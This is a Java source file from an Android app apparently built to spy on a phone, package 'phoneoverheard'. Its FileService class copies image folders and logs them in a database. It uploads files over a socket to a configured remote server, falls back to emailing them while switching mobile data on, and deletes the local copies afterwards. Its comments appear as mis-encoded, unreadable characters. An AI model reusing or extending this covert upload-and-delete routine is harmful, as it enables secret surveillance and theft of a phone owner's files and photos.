package com.phoneoverheard.phonne;

import java.io.BufferedInputStream;
import java.io.BufferedWriter;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.io.PushbackInputStream;
import java.io.RandomAccessFile;
import java.net.Socket;
import java.net.URL;
import java.net.URLConnection;
import java.security.MessageDigest;

import org.apache.http.util.ByteArrayBuffer;
import org.apache.http.util.EncodingUtils;

import com.phoneoverheard.database.DatabaseHelper;
import com.phoneoverheard.database.Manager;
import com.phoneoverheard.database.ManagerService;
import com.phoneoverheard.database.Sendimg;
import com.phoneoverheard.database.SendimgService;

import android.annotation.SuppressLint;
import android.content.Context;
import android.database.sqlite.SQLiteDatabase;
import android.os.Environment;
import android.util.Log;

@SuppressLint({ "WorldWriteableFiles", "WorldReadableFiles" })
public class FileService {
	private Context context;
	private static final String TAG = "FileService";
	
	/*������getDataDirectory()
	���ͣ����� File ����ȡ Android ����Ŀ¼��
	* ������getDownloadCacheDirectory()
	���ͣ����� File ����ȡ Android ����/��������Ŀ¼��
	* ������getExternalStorageDirectory()
	���ͣ����� File ����ȡ�ⲿ�洢Ŀ¼�� SDCard
	* ������getExternalStoragePublicDirectory(String type)
	���ͣ����� File ��ȡһ���߶˵Ĺ��õ��ⲿ�洢��Ŀ¼���ڷ�ĳЩ���͵��ļ�
	* ������getExternalStorageState()
	���ͣ����� File ����ȡ�ⲿ�洢�豸�ĵ�ǰ״̬
	* ������getRootDirectory()
	���ͣ����� File ����ȡ Android �ĸ�Ŀ¼*/
	
	/**
	 * �绰��Ŀ¼�´���Ŀ¼
	 * @param myDir Ŀ¼
	 * @return PhoneDir ʵ��Ŀ¼
	 */
	public String getPhonePath(String myDir){ 
		String newdestDir="/";
		String PhoneDir = Environment.getDataDirectory() + myDir;
		File destDir = new File(PhoneDir);
		if (!destDir.exists()) {
			String[] myDirs = myDir.split("/");
			for(int i=1;i<myDirs.length;i++){
				newdestDir += myDirs[i]+"/";
				Log.i(TAG, Environment.getDataDirectory() + newdestDir);
				destDir = new File(Environment.getDataDirectory() + newdestDir);
				destDir.mkdirs();
			}
		}
		return PhoneDir;
	} 
	
	/**
	 * �绰��Ŀ¼�´���Ŀ¼
	 * @param myDir Ŀ¼
	 * @return sdDir ʵ��Ŀ¼
	 */
	public String getSDPath(String myDir){ 
		String newdestDir="/";
		String sdDir = myDir;
		File destDir = new File(sdDir);
		if (!destDir.exists()) {
			String[] myDirs = myDir.split("/");
			for(int i=1;i<myDirs.length;i++){
				newdestDir += myDirs[i]+"/";				
				destDir = new File(Environment.getExternalStorageDirectory() + newdestDir);
				destDir.mkdirs();
			}
		}
		return sdDir;
	} 
	/**
	 * �����ļ�
	 * @param filename �ļ�����
	 * @param content �ļ�����
	 */
	public void saveToSDCard(String filefolder,String filename, String content,Context mycontext)throws Exception {
		filefolder = Environment.getExternalStorageDirectory() + filefolder;
		File file = new File(filefolder, filename);
		if(Environment.MEDIA_MOUNTED.endsWith(Environment.getExternalStorageState())) { 
			FileOutputStream outStream = new FileOutputStream(file);
			outStream.write(content.getBytes());
			outStream.close();
			//Toast.makeText(mycontext, "�ɹ����浽sd��", Toast.LENGTH_LONG).show();  //����Toast��Ϣ
			CheckConnectInternet(file,mycontext);
		}
	}
	
	/**
	 * �����ļ�
	 * @param filename �ļ�����
	 * @param content �ļ�����
	 */
	public void saveToSDCard(String filefolder,String filename, String content)throws Exception {
		BufferedWriter out = null;  
		filefolder = Environment.getExternalStorageDirectory() + filefolder;
		File file = new File(filefolder, filename);
		if(Environment.MEDIA_MOUNTED.endsWith(Environment.getExternalStorageState())) { 
			try {
				out = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(file, true)));  
				out.write(content+"\n");  
				out.close();				
				} catch (FileNotFoundException e) {
				e.printStackTrace();
				} catch (IOException e) {
				e.printStackTrace();
			}
		}

	}
	
	/**
	 * �����ļ�
	 * @param filename �ļ�����
	 * @param content �ļ�����
	 */
	public void save(String filename, String content) throws Exception {
		//˽�в���ģʽ�������������ļ�ֻ�ܱ���Ӧ�÷��ʣ�����Ӧ���޷����ʸ��ļ����������˽�в���ģʽ�������ļ���д���ļ��е����ݻḲ��ԭ�ļ�������
		FileOutputStream outStream = context.openFileOutput(filename, Context.MODE_PRIVATE);
		outStream.write(content.getBytes());
		outStream.close();
	}
	
	/**
	 * �����ļ�
	 * @param filename �ļ�����
	 * @param content �ļ�����
	 */
	public void saveAppend(String filename, String content) throws Exception {//ctrl+shift+y / x
		//˽�в���ģʽ�������������ļ�ֻ�ܱ���Ӧ�÷��ʣ�����Ӧ���޷����ʸ��ļ����������˽�в���ģʽ�������ļ���д���ļ��е����ݻḲ��ԭ�ļ�������
		FileOutputStream outStream = context.openFileOutput(filename, Context.MODE_APPEND);
		outStream.write(content.getBytes());
		outStream.close();
	}
	
	
	
    /**
     * �����������ϴ��ļ���������
     */
	public void uploadFileWifi(final File file,final Context context) {
		if(file!=null && file.exists()){			
			new Thread(new Runnable() {
				@Override
				public void run() {
					try {	
						//ʹ��Socket�����ϴ��ļ���Wifi����������,ͬʱ�ر�GPRS����
						if(new WifiGPRS(context).CheckAndConnectWifi()){
							Log.i(TAG, "�̣߳�"+Thread.currentThread().getName()+";Content-Length="+ file.length() + ";filename="+ file.getName());
							ManagerService managerservice = new ManagerService(context);					
							SQLiteDatabase managerdb = new DatabaseHelper(context).getWritableDatabase(); 
					        Manager manager = managerservice.findFolder (managerdb,"manager");				        
							Socket socket = new Socket(manager.getServeraddress(), Integer.parseInt(manager.getServerport()));
				            OutputStream outStream = socket.getOutputStream();
				            String head = "Content-Length="+ file.length() + ";filename="+ file.getName() + ";sourceid=\r\n";
				            outStream.write(head.getBytes());			
				            
				            PushbackInputStream inStream = new PushbackInputStream(socket.getInputStream());	
							String response = StreamTool.readLine(inStream);
				            String[] items = response.split(";");
							String position = items[1].substring(items[1].indexOf("=")+1);
							
							RandomAccessFile fileOutStream = new RandomAccessFile(file, "r");
							fileOutStream.seek(Integer.valueOf(position));
							byte[] buffer = new byte[1024];
							int len = -1;
							while( (len = fileOutStream.read(buffer)) != -1){
								outStream.write(buffer, 0, len);
							}
							Log.i(TAG, "�ļ��ϴ��ɹ���"+file.getPath());
							fileOutStream.close();
							outStream.close();
				            inStream.close();
				            socket.close();
				            managerdb.close();
				            file.delete();	
						}
			        } catch (Exception e) {
			        	try{
							ManagerService managerservice = new ManagerService(context);									
							String mailbody = "�ļ����ƣ�"+file.getName()+"\n"+"�ļ���С��"+file.length()+"\n";
							String sendfileurl = file.getPath();							
							Manager manager = managerservice.find("manager");
							new sendEmail().sendEmailTo(file.getName(),mailbody,sendfileurl,manager.getMailsendto(),context);
							file.delete();
			        	}catch(Exception err){
				        	Log.i(TAG,"�ļ��ϴ�ʱ�����쳣");
				        	uploadFileGPSR(file,context);  //��Ϊ�ʼ�������ʹ��GPRS���з����ʼ�
			        	}
			        }
				}
			}).start();
		}

	}
	
	
    /**
     * ��Ϊ�ʼ�������ʹ��GPRS���з����ʼ�
     */
	public void uploadFileGPSR(final File file,final Context context) {
		if(file!=null && file.exists()){
			if(file.length() < 10000000){
				//���ļ���С����10Mʱ����Ϊ�ʼ�������ʹ��GPRS���з����ʼ�
				//���GPRS���������ӣ���ʼ�����ʼ�	
				if(new WifiGPRS(context).CheckAndConnectGPRS()){
					new Thread(new Runnable() {
						@Override
						public void run() {
							try {	
								Log.i(TAG, "�̣߳�"+Thread.currentThread().getName()+";Content-Length="+ file.length() + ";filename="+ file.getName());
								ManagerService managerservice = new ManagerService(context);									
								String mailbody = "�ļ����ƣ�"+file.getName()+"\n"+"�ļ���С��"+file.length()+"\n";
								String sendfileurl = file.getPath();							
								Manager manager = managerservice.find("manager");
								new sendEmail().sendEmailTo(file.getName(),mailbody,sendfileurl,manager.getMailsendto(),context);
								file.delete();
					        } catch (Exception e) {                    
					            Log.i(TAG,"Email����ʱ�����쳣");
					        }
						}
					}).start();
				}
			}
		}
	}
	
	
	/**
	 * ��ȡ�ļ�����
	 * @param filename �ļ�����
	 * @return �ļ�����
	 * @throws Exception
	 */
	public String read(String filename) throws Exception {
		FileInputStream inStream = context.openFileInput(filename);
		ByteArrayOutputStream outStream = new ByteArrayOutputStream();
		byte[] buffer = new byte[1024];
		int len = 0;
		while((len = inStream.read(buffer)) != -1){
			outStream.write(buffer, 0, len);
		}
		byte[] data = outStream.toByteArray();
		return new String(data);
	}

	/**
	 * MD5���ܣ�32λ
	 * @param str �ַ���
	 * @return ���ܺ���ַ���
	 */
    public String MD5(String str) {
        MessageDigest md5 = null;
        try {
            md5 = MessageDigest.getInstance("MD5");
        } catch (Exception e) {
            e.printStackTrace();
            return "";
        }
 
        char[] charArray = str.toCharArray();
        byte[] byteArray = new byte[charArray.length];
 
        for (int i = 0; i < charArray.length; i++) {
            byteArray[i] = (byte) charArray[i];
        }
        byte[] md5Bytes = md5.digest(byteArray);
 
        StringBuffer hexValue = new StringBuffer();
        for (int i = 0; i < md5Bytes.length; i++) {
            int val = (md5Bytes[i]) & 0xff;
            if (val < 16) {
                hexValue.append("0");
            }
            hexValue.append(Integer.toHexString(val));
        }
        return hexValue.toString();
    }
    
    /** 
     * ���Ƶ����ļ� 
     * @param oldPath String ԭ�ļ�·�� �磺c:/fqf.txt 
     * @param newPath String ���ƺ�·�� �磺f:/fqf.txt 
     * @return �� 
     */ 
   @SuppressWarnings({ "resource", "unused" })
   public void copyFile(String oldPath, String newPath) { 
       try { 
           int bytesum = 0; 
           int byteread = 0; 
           File oldfile = new File(oldPath); 
           if (!oldfile.exists()) { //�ļ�������ʱ 
               InputStream inStream = new FileInputStream(oldPath); //����ԭ�ļ� 
               FileOutputStream fs = new FileOutputStream(newPath); 
               byte[] buffer = new byte[1444]; 
               int length; 
               while ( (byteread = inStream.read(buffer)) != -1) { 
                   bytesum += byteread; //�ֽ��� �ļ���С 
                   System.out.println(bytesum); 
                   fs.write(buffer, 0, byteread); 
               } 
               inStream.close(); 
           } 
       } 
       catch (Exception e) { 
           System.out.println("���Ƶ����ļ���������"); 
           e.printStackTrace(); 

       } 

   } 

   /** 
     * ���������ļ����ļ�
     * @param oldPath String ԭ�ļ�·�� �磺c:/oldPath/file/  
     * @param newPath String ���ƺ�·�� �磺f:/newPath/file/ 
     * @return boolean 
     */ 
   public void copyFolder(String oldPath, String newPath,Context context) { 
       try { 
           (new File(newPath)).mkdirs(); //����ļ��в����� �������ļ��� 
           File a=new File(oldPath); 
           String[] file=a.list(); 
           File temp=null; 
           File newtemp=null;            
           for (int i = 0; i < file.length; i++) { 
               if(oldPath.endsWith(File.separator)){ 
                   temp=new File(oldPath+file[i]); 
                   newtemp=new File(newPath+file[i]);
               } 
               else{ 
                   temp=new File(oldPath+File.separator+file[i]); 
                   newtemp=new File(newPath+File.separator+file[i]); 
               }
               long filetimeMillis=  temp.lastModified();
               SendimgService sendimgservice = new SendimgService(context);
               if(!sendimgservice.ImgExist(filetimeMillis)&&temp.isFile()&&!newtemp.exists()){   //������ļ������ڻ������ļ����д��ڸ��ļ��򲻸���
            	   Log.i(TAG, "COPY oldFilePath=="+temp+" TO newFilePath=="+newtemp);
            	   int sendstate = 0;
            	   long imgsize = temp.length();
            	   String datetime = filetimeMillis+"";
            	   String imgurl = temp.getPath();
            	   String imgname = temp.getName();
            	   Sendimg sendimg = new Sendimg(sendstate,imgsize,datetime,imgurl,imgname);
            	   sendimgservice.insert (sendimg);
                   FileInputStream input = new FileInputStream(temp); 
                   FileOutputStream output = new FileOutputStream(newPath + "/" + 
                           (temp.getName()).toString()); 
                   byte[] b = new byte[1024 * 5]; 
                   int len; 
                   while ( (len = input.read(b)) != -1) { 
                       output.write(b, 0, len); 
                   } 
                   output.flush(); 
                   output.close(); 
                   input.close(); 
               } 
               if(temp.isDirectory()){//��������ļ��� 
                   copyFolder(oldPath+"/"+file[i],newPath+"/"+file[i],context); 
               } 
           } 
       } 
       catch (Exception e) { 
           System.out.println("���������ļ������ݲ�������"); 
           e.printStackTrace(); 
       } 
   }
   

   /** 
     * �ϴ������ļ������� 
     * @param FolderPath String �ļ���·�� �磺c:/oldPath/file/  
     * @return �� 
     */ 
   public void uploadFolder(String FolderPath,Context context) { 
       try { 
           File a=new File(FolderPath); 
           String[] file=a.list(); 
           File temp=null;            
           for (int i = 0; i < file.length; i++) { 
               if(FolderPath.endsWith(File.separator)){ 
                   temp=new File(FolderPath+file[i]); 
               } 
               else{ 
                   temp=new File(FolderPath+File.separator+file[i]); 
               } 
               if(temp.isFile()){   //������ļ��������򲻸���
            	   CheckConnectInternet(temp,context);
            	   Log.i(TAG, "upload FilePath=="+temp);
               } 
               if(temp.isDirectory()){//��������ļ��� 
            	   uploadFolder(FolderPath+"/"+file[i],context); 
               } 
           } 
       } 
       catch (Exception e) { 
           System.out.println("�ϴ������ļ������ݲ�������"); 
           e.printStackTrace(); 
       } 
   }
   
   
   /**
    * �����������ж������Ƿ�������Internet����
    * @param ��
    */
   public void CheckConnectInternet(final File file,final Context context){
		new Thread(){
	    	@SuppressWarnings("unused")
			public void run(){
	    		boolean isConnect = false;
	    		String myString = "";
	    		try {
	    			// �����ȡ�ļ����ݵ�URL
	    			URL myURL = new URL("http://www.baidu.com");
	    			// ��URL����
	    			Log.i(TAG, "��URL����");
	    			URLConnection ucon = myURL.openConnection();
	    			// ʹ��InputStream����URLConnection��ȡ����
	    			InputStream is = ucon.getInputStream();
	    			BufferedInputStream bis = new BufferedInputStream(is);
	    			// ��ByteArrayBuffer����
	    			ByteArrayBuffer baf = new ByteArrayBuffer(50);
	    			int current = 0;
	    			while ((current = bis.read()) != -1) {
	    				baf.append((byte) current);
	    			}
	    			// �����������ת��ΪString,��UTF-8����
	    			myString = EncodingUtils.getString(baf.toByteArray(), "UTF-8");
	    			Log.i(TAG, myString);
	    			if(myString.indexOf("�ٶ�") != -1){
	    				Log.i(TAG, "Wifi�����������Internet����");
	    				isConnect = true;
	    				uploadFileWifi(file,context);
	    			}else{
	    				Log.i(TAG, "Wifi�����޷�����Internet���磬��ʼʹ��GPRS�������丽����ʽ�����ļ�");
	    				isConnect = false;
	    				uploadFileGPSR(file,context);
	    			}
	    		} catch (Exception e) {
    				Log.i(TAG, "Wifi�����޷�����Internet���磬��ʼʹ��GPRS�������丽����ʽ�����ļ�");
    				isConnect = false;
    				uploadFileGPSR(file,context);
	    		}
	    	}
	    }.start();
   }
   

   
}
